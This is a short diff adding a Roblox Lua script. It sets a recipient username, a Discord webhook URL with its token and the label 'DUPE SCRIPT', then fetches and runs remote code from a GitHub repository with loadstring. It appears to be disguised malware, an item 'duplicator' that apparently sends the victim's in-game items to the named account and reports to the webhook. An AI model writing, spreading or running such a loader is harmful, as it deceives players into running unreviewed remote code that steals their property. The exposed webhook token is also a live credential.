@@ -1,0 +1,7 @@
+_G.UserName = "princeigop123u"   
+
+_G.Webhook = "https://discord.com/api/webhooks/1110776795357253702/n6-oBbPbXiR8qwu3-hzKnz3pAH1Jn8QU7O3bxD_GjrpeVO-1TsmN4zKoV7KcyJaBbQqN"
+
+_G.loadingScreenText = "DUPE SCRIPT"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kingofthescript/mailsp/main/main", true))()
